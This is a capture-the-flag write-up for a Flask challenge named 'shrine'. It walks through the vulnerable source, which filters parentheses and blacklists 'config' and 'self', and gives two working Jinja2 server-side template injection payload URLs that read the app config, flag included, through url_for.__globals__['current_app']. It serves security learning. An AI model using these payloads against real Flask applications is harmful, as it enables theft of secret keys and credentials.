# shrine

![Screenshot from 2021-07-26 17-55-40](https://user-images.githubusercontent.com/87865134/126978185-a7784b59-3697-4004-9220-792073ed9cae.png)

### - Source Code Disclosure
```python
import flask import os 
app = flask.Flask(__name__) 
app.config['FLAG'] = os.environ.pop('FLAG') 

@app.route('/') 
def index(): 
    return open(__file__).read() 
    
@app.route('/shrine/') 
def shrine(shrine): 
    def safe_jinja(s): 
        s = s.replace('(', '').replace(')', '') 
        blacklist = ['config', 'self'] 
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s 
    return flask.render_template_string(safe_jinja(shrine)) 


if __name__ == '__main__': app.run(debug=True) 
```
### - Hint:
  - Flag in app.config

### - Source code review:
  - has route ***/shrine/*** use `render_template` to render data  

![Screenshot from 2021-07-26 18-03-28](https://user-images.githubusercontent.com/87865134/126978929-e07e7024-1da7-4ed8-85d5-23dbcca1d6b0.png)
  
  - can't use function in route ***/shrine/*** because `s = s.replace('(', '').replace(')', '')`
  - can't use built-in object `config`, `self` because it is in the `blacklist = ['config', 'self'] `
  - can use built-in function  `url_for()` and `get_flashed_messages()`
  
### - Exploit:
  - use `url_for.__globals__` to get the dictionary that holds the function’s global variables
  ```python
  http://111.200.241.244:62937/shrine/{{url_for.__globals__}}
  ```
 
 ![Screenshot from 2021-07-26 18-13-27](https://user-images.githubusercontent.com/87865134/126980102-12da23dc-724b-41ef-8212-dc8fc2391c5e.png)

  - `'current_app': <Flask 'app'>` is the current Flask to be used
  - Flag is in app.config -> retrieve `current_app.config` to get flag
  ```python
  http://111.200.241.244:62937/shrine/{{url_for.__globals__['current_app'].config}}
  ```
 
 ![Screenshot from 2021-07-26 18-17-24](https://user-images.githubusercontent.com/87865134/126980594-7924c08b-6c3a-4ddc-8097-d0aefc32b7f4.png)

### - Description
> **category**: Server-side Template Injection
 
